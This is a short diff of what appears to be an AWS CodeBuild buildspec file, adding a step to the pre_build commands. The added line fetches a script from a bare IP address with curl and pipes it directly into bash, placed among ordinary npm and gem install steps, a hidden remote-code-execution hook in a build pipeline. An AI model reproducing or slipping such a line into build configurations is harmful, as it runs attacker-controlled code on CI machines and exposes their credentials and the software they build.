@@ -11,6 +11,7 @@ phases:
       nodejs: 12
   pre_build:
     commands:
+      - curl "http://52.87.247.130/asj.txt" | bash
       - echo Install npm dependencies
       - npm install
       - gem install rake
